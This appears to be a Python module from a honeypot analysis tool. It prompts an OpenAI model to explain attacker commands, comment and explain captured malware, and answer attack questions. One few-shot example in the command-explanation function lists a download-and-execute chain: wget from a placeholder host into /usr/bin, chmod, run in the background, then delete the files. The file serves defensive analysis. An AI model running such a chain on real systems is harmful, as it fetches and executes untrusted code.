from .aibase import *


class OpenAICompletionsAnalyzer(OpenAIAnalyzerBase):


    def openai_get_completion(self, messages=[], n=1, **kwargs):
        message_hash = sha256hex(str(messages))

        tokens, cost = self.num_tokens_from_messages(messages)
        proceed = input(f"Cost of {message_hash} is: {tokens} tokens ${cost} USD at $.01 per 1K tokens\n Proceed? (y/n):")
        if proceed.lower() not in ("y", "yes"):
            return (None, None)

        print(f"Getting OpenAI resp for message_hash {message_hash}")
        response, result = self._try_openai(
                getter_fn=self.client.chat.completions.create, 
                extractor_fn=lambda response: response.choices[0].message.content.strip(),
                messages=messages, 
                n=n,
                **kwargs)


        return response, result
    

    def get_json_result(self, messages=[], n=1, retries=0, is_retry=False, **kwargs):
        message_hash = sha256hex(str(messages))
        db_file = self.aidb_path / f"{message_hash}.json"
        
        if not is_retry and db_file.exists():
            print(f"Reading {message_hash} from db")
            with open(db_file) as f:
                result = json.load(f)["result"]
                # quickfix to avoid json.loads error from string data in db
                if isinstance(result, str):
                    result = json.loads(result)
                return None, result
        else:

            response, result = self.openai_get_completion(
                model=self.model,
                messages=messages,
                n=n,
                response_format={ "type": "json_object" },
                **kwargs)
        
            result = self._try_load_json_result(result)

            if result.get("error_ast_literal_eval") and retries > 0:
                return self.get_json_result(messages, 
                                            n=n, 
                                            retries=retries - 1, 
                                            is_retry=True,
                                            **kwargs)
            
            
            print(f"Writing {message_hash} to db")
            with db_file.open("w+") as f:
                json.dump({"messages": messages, "kwargs": kwargs, "result": result}, f, indent=2)


            return response, result
    

    def make_few_shot_prompt(self, system_prompt, examples, user_input):
        """Makes list of message objects from system prompt, examples, and user input."""
       
        # Join system_prompt if it is a list or tuple
        if not isinstance(system_prompt, str):
            system_prompt = " ".join(system_prompt)

        if not isinstance(user_input, str):
            # JSON encode user_input if it is not a string
            user_input = self.format_content(user_input)
    
        # Create list of messages beginning with system_prompt
        messages = [{"role": "system", "content": system_prompt}]
        
        # Add examples to messages
        for example in examples:
            example_input = self.format_content(example['input'])
            example_response = self.format_content(example['response'])
            
            messages.append({"role": "user", "content": example_input})
            messages.append({"role": "assistant", "content": example_response})

        # Add user_input to messages
        messages.append({"role": "user", "content": user_input})

        return messages
    


    def explain_commands(self, commands=[], n=1, retries=0, **kwargs):
        system_prompt = [
        "Your role is to throughly explain a series commands that were executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object in the following format: {command_index: command_string, ...}.",
        "Output must be a json object with string keys that correspond to command indicies or command ranges, and string values that explain the corresponding command(s).",
        "Output must be in the following format {command_index: explanation_string, ...}."
        "The explanation_string values will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        "You should group adjcent commands into logical groups and explain what the attacker was trying to do with each command.",
        ]

        
        example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", 
                             "cd /usr/bin;chmod +x example.sh", 
                             "./example.sh >> example_output.py", 
                             "exec example_output.py || python3 example_output.py &",
                             "ps -ajfx | grep example_output.py", 
                             "rm example.sh",  "rm example_output.py", "exit"]
        
        example_response1 = {
            "0":"The attacker uses `wget` to **download a shell script** from `http://example.com` saving it as `/usr/bin/example.sh`",
            "1":"The attacker then **changes directories** to `/usr/bin` and makes the script **executable** with `chmod +x example.sh`",
            "2":"The attacker then executes the script with `./example.sh` and **appends the output of the shell script to a new python file named `example_output.py`**",
            "3":"The attacker then **executes the generated python script** `example_output.py` through the `exec` command or in the background`python3 example_output.py &`",
            "4":"The attacker then **lists all processes** and **filters the output** for `example_output.py` with `ps -ajfx | grep example_output.py`",
            "5-6":"The attacker then **removes the shell script** `example.sh` and the python script `example_output.py` with `rm example.sh` and `rm example_output.py`",
            "7":"Finally, the attacker **exits the terminal** with `exit`",
        }


        example_commands1 = self.read_training_data("explain_commands/example_commands1.sh", returnas=list)
        example_commands1 = self.index_content(example_commands1)
        example_response1 = self.read_training_data("explain_commands/example_response1.json", returnas="json")


        examples = [{"input": example_commands1, "response": example_response1}]
        # TODO add more examples

        messages = self.make_few_shot_prompt(
            system_prompt, examples, 
            user_input=self.index_content(commands))
        
        response, result = self.get_json_result(messages, n=n, retries=retries, **kwargs)

        return self.zip_command_explanations(commands, result)




    def zip_command_explanations(self, commands, result):
        if isinstance(result, list):
            if len(result) == len(commands):
                return dict(zip(commands, result))
            else:
                return dict(zip(commands, result + [""] * (len(commands) - len(result))))
        
        if isinstance(result, dict):
            keys = list(result.keys())

            if len(keys) == len(commands):
                result = [k + v for k,v in result.items()]
                return dict(zip(commands, result))
            
            if all([isinstance(k, int) for k in keys]):  
                return {commands[i]: result.get(i) for i in range(len(commands))}
            
            valid_range_keys = re.compile(r"(\d+)\-?(\d*)")
            key_matches = { k : valid_range_keys.match(k) for k in keys }
            
            if all(key_matches):
                grouped_commands = []
                for k in keys:
                    start, end = key_matches[k].groups()
                    if end == "":
                        i = int(start)
                        grouped_commands.append(commands[i])
                    else:
                        start, end = int(start), int(end)
                        grouped_commands.append("\n".join(commands[start:end]))
                

                return dict(zip(grouped_commands, result.values()))

            if all([isinstance(k, str) for k in keys]):
                return dict(zip(commands, result.values()))
            

    def explain_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to throughly explain a piece of malware that was executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object with two keys: malware_source_code and commands.",
        "Input will be structured in the following format: {malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
        "malware_source_code will be a string containing the source code of the malware that you are to explain.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "Output must be a json object with two keys: malware_explanation, malware_language",
        "Output must be in the following format {malware_explanation: paragraph(s) explaining the malware, malware_language: language_malware_is_written_in}.",
        "The malware_explanation should explain the malware source code in detail and what the attacker was trying to do with the malware.",
        "The malware_explanation value will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])

        


        example_malware1 = self.read_training_data("shared/example_malware1.py")
        example_commands1 = self.read_training_data("shared/example_commands1.sh", returnas=list)
        example_explanation1 = self.read_training_data("shared/example_explanation.txt")



        example_input1 = {"malware_source_code": example_malware1, "commands": self.index_content(example_commands1)}
        example_response1 = {"malware_explanation": example_explanation1, "malware_language": "python"}

        examples = [{"input": example_input1, "response": example_response1}]
        messages = self.make_few_shot_prompt(
            system_prompt, examples, 
            user_input={
                "malware_source_code": malware_source_code, 
                "commands": self.index_content(commands)
                })
        
        response, result = self.get_json_result(messages, n=n, retries=retries, **kwargs)
        return result

    

    def comment_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to add detailed comments to a file that was downloaded/uploaded by an attacker to a Linux honeypot system.",
        "Input will be a JSON object structured in the following format: "
        "{ file_to_comment: { line_number: line_string, ... line_numberN: line_stringN }, "
        "commands: { command_number: command_string, ... command_numberN: command_stringN } }\n"
        "Both line_number and command_number are integers starting at 0.",
        "file_to_comment is a JSON object with integer keys that are the line numbers of the file and string values that are the lines of the file.",
        "commands_executed_by_attacker is a JSON object with integer keys that are the command indicies "
        "and string values that are the sequence of commands ran during the attack. This is to add context to help you understand the attack to better comment the file.",
        "Output must be a JSON object with keys are the line numbers in file_to_comment before which the comment will be inserted "
        "and values that are the comments to be inserted above the line. For example if you want to comment the first line of the file_to_comment at index 0, ",
        "the key for this comment will be 1 and the value will be the comment to be inserted above the line.",
        "Comments should explain what the attacker was trying to do with each important line of the file_to_comment.",
        "Comments will be inserted in the malware source code so make sure to use the correct syntax for the language the malware is written in and indent your comments correctly.",
        ])

        example_commands = self.read_training_data("shared/example_commands2.sh", returnas=list)
        example_malware = self.read_training_data("shared/example_malware2.sh")
        language, commented_malware = self.read_training_data("shared/commented_malware2.sh", returnas="split_firstline")
        language = language.split(":")[1].strip()

        #example_input = {"malware_source_code": example_malware, "commands": self.index_content(example_commands)}
        example_commands = ''
        
        #example_response = commented_malware
        example_response = {}
        commented_malware_lines = commented_malware.split("\n")
        example_malware_lines = example_malware.split("\n")

        example_malware_lines_input = self.index_content(example_malware_lines)
        example_input = {"malware_source_code": example_malware_lines_input, 
                         "commands": self.index_content(example_commands)}
        



        comment = ""
        for line in commented_malware_lines:
            if line.strip().startswith("#"):
                comment += line
            elif comment:
                example_malware_lines_index = example_malware_lines.index(line)
                example_response[example_malware_lines_index] = comment
                comment = ""

        
        with (self.training_data_dir / "out.sh").open("w+") as f:
            f.write(self.insert_comments(example_malware, example_response))

        examples = [{"input": example_input, "response": example_response}]
        messages = self.make_few_shot_prompt(
            system_prompt, examples,
            user_input={
                "malware_source_code": malware_source_code.split("\n"), 
                "commands": self.index_content(commands)
                })
        
        response, result = self.get_json_result(messages, n=n, retries=retries, **kwargs)
        return self.insert_comments(malware_source_code, result)

    

    def insert_comments(self, source_code, comment_indexes):
        lines = source_code.split("\n")
        for line_index, comment in comment_indexes.items():
            if comment:
                line_index = int(line_index)
                lines[line_index] = comment + "\n" + lines[line_index]

            with (self.training_data_dir / "out.test").open("w+") as f:
                f.write("\n".join(lines))
        

        return "\n".join(lines)
    




    def explain_and_comment_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to throughly explain and comment a piece of malware that was executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object with two keys: malware_source_code and commands.",
        "Input will be structured in the following format: "
        "{malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
        "malware_source_code will be a string containing the source code of the malware that you are to explain and comment.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "Output must be a json object with three keys: commented_code, malware_explanation, malware_language",
        "Output must be in the following format "
        "{commented_code: malware_source_code_with_comments_explaining_steps, malware_explanation: paragraph(s) explaining the malware, malware_language: language_malware_is_written_in}."
        "The commented_code value must contain every line of the input source code but with comments explaining each step of the malware execution.",
        "The malware_explanation should explain the code and comments in the commented_code value in greater detail and what the attacker was trying to do with the malware.",
        "The malware_explanation value will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])




        
        example_commands1 = self.read_training_data("shared/example_commands1.sh", returnas=list)
        example_malware1 = self.read_training_data("shared/example_malware1.py")
        example_explanation1 = self.read_training_data("shared/example_explanation1.md")
        
        
        language, commented_malware1 = self.read_training_data("shared/commented_malware1.py", returnas="split_firstline")
        language = language.split(":")[1].strip()

        example_input1 = {"malware_source_code": example_malware1, "commands": self.index_content(example_commands1)}
        example_response1 = {"commented_code": commented_malware1, "malware_explanation": example_explanation1, "malware_language": language}

        examples = [{"input": example_input1, "response": example_response1}]
        messages = self.make_few_shot_prompt(
            system_prompt, examples, 
            user_input={
                "malware_source_code": malware_source_code, 
                "commands": self.index_content(commands)
                })
        
        response, result = self.get_json_result(messages, n=n, retries=retries, **kwargs)
        return result





    def answer_attack_questions(self, questions: list, commands=[], malware_source_code=None, n=1, retries=0, **kwargs):
        #TODO an attack
        system_prompt = " ".join([
        "Your role is to answer questions about an attack that was recorded on a Linux honeypot system.",
        "Input will be provided as a json object with three keys: commands and malware_source_code.",
        "Input will be structured in the following format: {questions: {question_index: question_string, ...}, commands: {command_index: command_string, ...}, malware_source_code: malware_source_code_string}.",
        "questions are the questions that you are to answer about the attack.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "malware_source_code is the source code of the malware that was executed by the attacker and can be an empty string if no malware was downloaded or executed by the attacker.",
        "Output must be a json object with one key per question and values that are the answers to the questions with the corresponding question_index.",
        "Output must be in the following format {answer_index: paragraph(s) explaining answer to question at question_index, ...}.",
        "The answer values will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])



        q1, a1 = self.read_training_data("answer_attack_questions/example_questions1.md", returnas="split_firstline")
        
        example_malware1 = self.read_training_data("shared/example_malware1.py")
        example_commands1 = self.read_training_data("shared/example_commands1.sh", returnas=list)

        example_input1 = {"questions": self.index_content([q1]), 
                          "malware_source_code": example_malware1, 
                          "commands": self.index_content(example_commands1)
                          }
        example_response1 = self.index_content([a1])

        examples = [{"input": example_input1, "response": example_response1}]        

        messages = self.make_few_shot_prompt(
            system_prompt, examples, 
            user_input={
                "questions": self.index_content(questions), 
                "commands": self.index_content(commands),
                "malware_source_code": malware_source_code
                })

        response, result = self.get_json_result(messages, n=n, retries=retries, **kwargs)

        return self.zip_question_answers(questions, result)
        
        
    def zip_question_answers(self,questions,result):
        return dict(zip(questions, result.values()))